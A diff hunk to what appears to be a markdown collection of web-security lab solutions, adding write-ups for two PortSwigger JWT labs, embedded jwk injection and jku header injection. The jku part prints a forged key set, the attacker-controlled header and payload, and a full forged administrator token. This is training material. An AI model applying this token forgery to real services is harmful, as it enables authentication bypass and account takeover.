@@ -2589,6 +2589,104 @@ Cookie: session=eyJraWQiOiJiNzU4ZDZjOC01NTIzLTQ0YmQtOTgzYS1iMDlhZDA0YjBmOTciLCJh
 ```
 ![image](https://github.com/user-attachments/assets/f82cddc8-322a-4c85-bf1f-a5b59a270458)
 
+# JWT authentication bypass via jwk header injection
+
+This lab uses a JWT-based mechanism for handling sessions. The server supports the jwk parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token. However, it fails to check whether the provided key came from a trusted source. To solve the lab, modify and sign a JWT that gives you access to the admin panel at /admin, then delete the user carlos.
+
+---------------------------------------------
+References: 
+
+- https://portswigger.net/web-security/jwt
+- 
+![image](https://github.com/user-attachments/assets/b37a4fcd-1e69-4eb8-bc6e-60ff12c66e56)
+---------------------------------------------
+
+In “JWT Editor Keys”, generate a RSA key:
+
+![image](https://github.com/user-attachments/assets/de2625a0-22d3-4068-ad95-bc4fb5968eb6)
+
+In Repeater, in the “JSON Web Token” tab, click “Attack” and “Embedded JWK”:
+
+![image](https://github.com/user-attachments/assets/7e990b67-ab00-42de-91a0-83ea68b65464)
+
+With this added to the JWT, it is possible to access as administrator:
+
+![image](https://github.com/user-attachments/assets/fad1d07a-f2e9-4386-a8b8-316fc8054838)
+
+# **JWT authentication bypass via jku header injection**
+
+This lab uses a JWT-based mechanism for handling sessions. The server supports the jku parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key.
+To solve the lab, forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos.
+
+---------------------------------------------
+References: 
+
+- https://portswigger.net/web-security/jwt
+- https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c
+![image](https://github.com/user-attachments/assets/12324d4b-6142-4f02-9589-d0178114cddf)
+---------------------------------------------
+
+It llok like the file “/.well-known/jwks.json” does not exist:
+
+![image](https://github.com/user-attachments/assets/8f919e31-0e34-4ec0-9b73-05a44b69be0d)
+
+First I copied the public key part of the RSA key:
+
+![image](https://github.com/user-attachments/assets/852a1f63-8c75-4c8a-abe4-d80658581448)
+
+And create “/jwks.json” in the exploit server. I added the field "use": "sig":
+
+![image](https://github.com/user-attachments/assets/c54371b1-7c51-4903-baf2-cd084b7e3cc0)
+![image](https://github.com/user-attachments/assets/e6fb30e8-7c22-425b-8ea1-a018256009c4)
+
+```
+{
+    "keys": [
+        {
+            "kty": "RSA",
+            "e": "AQAB",
+            "kid": "36dbda36-552c-438b-ac4c-9e365fb78ec5",
+            "n": "zdCdoh120Xnv9C_UywxJX78dtqOyMS42cXfmnjTYEuShgMd4yABQeUuObibikuytdaopdW0PtY1Q2AYOg0H6A4iBbTzRHNaN85IOb5J7mgiHHp7oIjDlQ6wajZsraj3US4hX3TdK3gcEG-h0EWpSh9A34yfq3HCKLdEVbV0XgRmI3N6Nc_VX5aIcGkoALHZBd9g179CfBtvtUu3cFPZA8eC9iv5xv1AyO4IdlOVdKjNernPu94LzzyYlHObHHWj-BaC5Px4J0jDymdPc9HaLm67nlA0aqZ6KA4HwzZHGJEb2UO_-Ya1HCsRhrnz2e2QRPVAOHgQkPWMKJb6vOFU5OQ"
+        }
+    ]
+}
+```
+Then I created the JWT:
+
+![image](https://github.com/user-attachments/assets/65078e68-5e15-4f30-b574-603bd4bbb698)
+
+Header with:
+- The same “kid” as the public key uploaded
+- A “jku” value pointing to the file created in the exploit server
+```
+{
+  "kid": "36dbda36-552c-438b-ac4c-9e365fb78ec5",
+  "alg": "RS256",
+  "jku": "https://exploit-0a3700d5034894e7808139f701b000a7.exploit-server.net/jwks.json"
+}
+```
+Payload with:
+
+- The “sub” value changed to the user administrator
+
+``` 
+{
+  "iss": "portswigger",
+  "sub": "administrator",
+  "exp": 1683792794
+}
+``` 
+
+The JWT:
+
+```
+eyJraWQiOiIzNmRiZGEzNi01NTJjLTQzOGItYWM0Yy05ZTM2NWZiNzhlYzUiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXhwbG9pdC0wYTM3MDBkNTAzNDg5NGU3ODA4MTM5ZjcwMWIwMDBhNy5leHBsb2l0LXNlcnZlci5uZXQvandrcy5qc29uIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3OTI3OTR9.mY28w-Jf8fMZzO_9qNug5rWXMG8bQq-zpuQLmsQnPPjLziXt5vHOESQeZcCs5wZaagVwkXU9IuRW0mvXsM5AwvuCDG1K22XIP_mL2-RNBQpN_qOE1HVJPIdy-Iq0F1V1DgEAYcNo9QQgcxX1AmhW9AQ0urD4qnLGk8leZYX-J4okBw-583qj2NsgX5zPan_JJ0bqupysw1cy8G9eR4h57wV1wM5oOiGhS5fX2gasKq5RSv4TUQ0Rk6FwONnmNhFJMNKn7HYRxGeoDv-A1118w49G6QSDqWsSuuFgCPy2oLQ-TGMDJBBDBGUNNy-serxOKJ7JjkY9qp1sC9E5hekzHQ
+``` 
+![image](https://github.com/user-attachments/assets/811f91c4-d255-452d-8de1-c10656993ba8)
+
+If done with Burp:
+![image](https://github.com/user-attachments/assets/9be23efc-7bfd-4f78-8ea5-95e48ccf6f1f)
+
 ## LDAP Injection
 LDAP Injection exploits applications that construct LDAP queries based on user input.
 
